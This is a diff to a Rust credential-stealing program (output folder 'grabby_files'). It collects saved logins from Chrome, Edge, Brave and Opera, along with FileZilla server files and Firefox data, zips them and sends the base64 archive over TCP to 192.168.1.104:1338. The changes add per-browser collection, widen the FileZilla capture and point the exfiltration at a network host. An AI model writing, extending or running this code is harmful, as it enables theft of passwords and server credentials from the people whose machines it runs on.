@@ -54,16 +54,16 @@ fn main() -> std::io::Result<()> {
 
     // Chrome
     // https://github.com/alient12/decrypt-chrome-passwords/blob/main/decrypt_chrome_password.py
-    chrome_export("Google\\Chrome");
+    chrome_export("Google\\Chrome", "chrome");
         
     // Edge
-    chrome_export("Microsoft\\Edge");
+    chrome_export("Microsoft\\Edge", "edge");
 
     // Brave
-    chrome_export("BraveSoftware\\Brave-Browser");
+    chrome_export("BraveSoftware\\Brave-Browser", "brave");
 
     // Opera
-    chrome_export("Opera Software\\Opera Stable");
+    chrome_export("Opera Software\\Opera Stable", "opera");
         
     // Windows
     windows_export();
@@ -116,14 +116,17 @@ fn filezilla_export() {
     let mut sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\sitemanager.xml");
     let mut recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\recentservers.xml");
     
-    if !Path::new(&sitemanager).exists() || !Path::new(&recentservers).exists(){
+    if !Path::new(&sitemanager).exists(){
         sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\FileZilla\\sitemanager.xml");
+    }
+    if !Path::new(&recentservers).exists(){
         recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\FileZilla\\recentservers.xml");
     }
     
-    if Path::new(&sitemanager).exists() && Path::new(&recentservers).exists(){
-
+    if Path::new(&sitemanager).exists(){
         fs::copy(sitemanager, "grabby_files/filezilla/sitemanager.xml").expect("err");
+    }
+    if Path::new(&recentservers).exists(){
         fs::copy(recentservers, "grabby_files/filezilla/recentservers.xml").expect("err");
     }
 }
@@ -146,7 +149,7 @@ fn firefox_export() {
     }
 }
 
-fn chrome_export(browser_path: &str) {
+fn chrome_export(browser_path: &str, browser_name: String) {
 
     let mut local_state = format!("{}\\AppData\\Local\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
     let mut login_data = format!("{}\\AppData\\Local\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);
@@ -159,8 +162,8 @@ fn chrome_export(browser_path: &str) {
     
     if Path::new(&local_state).exists() && Path::new(&login_data).exists() {
         
-        fs::copy(local_state, "grabby_files/chrome/Local State").expect("err");
-        fs::copy(login_data, "grabby_files/chrome/Login Data").expect("err");
+        fs::copy(local_state, format!("grabby_files/{}/Local State", browser_name)).expect("err");
+        fs::copy(login_data, format!("grabby_files/{}/Login Data", browser_name)).expect("err");
     }
 }
 
@@ -237,8 +240,7 @@ fn create_archive() -> String {
 }
 
 fn send_back(zipped_content_b64: String) {
-    // Socket stuff
-        let mut stream = TcpStream::connect("127.0.0.1:1338");
 
+        let mut stream = TcpStream::connect("192.168.1.104:1338");
         stream.unwrap().write(zipped_content_b64.as_bytes());
 }
